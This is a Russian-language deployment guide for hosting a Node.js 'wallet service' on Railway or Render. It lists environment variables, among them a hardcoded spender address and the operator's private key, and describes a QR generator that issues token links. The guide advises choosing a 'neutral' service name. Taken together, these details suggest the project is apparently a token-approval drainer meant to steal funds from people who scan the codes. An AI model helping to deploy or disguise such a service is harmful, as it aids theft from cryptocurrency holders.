# 🚀 Деплой на облачный хостинг

## Вариант 1: Railway (Рекомендуется - самый простой)

### Шаги:

1. **Зарегистрируйтесь на Railway:**
   - Перейдите на https://railway.app
   - Войдите через GitHub

2. **Создайте новый проект:**
   - Нажмите "New Project"
   - Выберите "Deploy from GitHub repo"
   - Выберите ваш репозиторий

3. **Настройте переменные окружения:**
   - В настройках проекта → Variables
   - Добавьте все переменные из `.env`:
     ```
     NETWORK=sepolia
     TOKEN_ADDRESS_SEPOLIA=ваш_адрес
     TOKEN_ADDRESS_MAINNET=ваш_адрес
     SPENDER_ADDRESS=0xE4576aC79aBbe431EdD7aA55111a843529285edB
     PRIVATE_KEY=ваш_приватный_ключ
     SEPOLIA_RPC_URL=ваш_rpc_url
     MAINNET_RPC_URL=ваш_rpc_url
     BASE_URL=https://ваш-проект.railway.app
     ```

4. **Деплой:**
   - Railway автоматически задеплоит проект
   - Получите URL вида: `https://ваш-проект.railway.app`
   - После деплоя обновите `BASE_URL` на реальный URL

---

## Вариант 2: Render

### Шаги:

1. **Зарегистрируйтесь на Render:**
   - Перейдите на https://render.com
   - Войдите через GitHub

2. **Создайте новый Web Service:**
   - Нажмите "New +" → "Web Service"
   - Подключите ваш GitHub репозиторий

3. **Настройки:**
   - **Name:** wallet-service (или любое другое нейтральное название)
   - **Environment:** Node
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
   - **Plan:** Free

4. **Переменные окружения:**
   - В разделе "Environment Variables" добавьте все из `.env`
   - Добавьте также:
     ```
     BASE_URL=https://ваш-проект.onrender.com
     ```

5. **Деплой:**
   - Нажмите "Create Web Service"
   - Render автоматически задеплоит проект
   - URL будет: `https://ваш-проект.onrender.com`
   - После деплоя обновите `BASE_URL` на реальный URL

---

## После деплоя:

1. **Обновите BASE_URL в переменных окружения** на ваш реальный URL
2. **Проверьте работу:**
   - Откройте `https://ваш-домен/qr-generator.html`
   - Сгенерируйте QR код
   - Проверьте, что URL в QR коде правильный

3. **Используйте новый URL:**
   - Вместо локального IP теперь будет нормальная ссылка
   - Например: `https://ваш-проект.railway.app/index.html?token=...`

---

## ⚠️ Важно:

- **Не коммитьте `.env` файл в Git!**
- Добавьте `.env` в `.gitignore`
- Используйте переменные окружения на платформе
- **Приватный ключ храните только в переменных окружения платформы!**
- После деплоя обязательно обновите `BASE_URL` на реальный URL вашего проекта

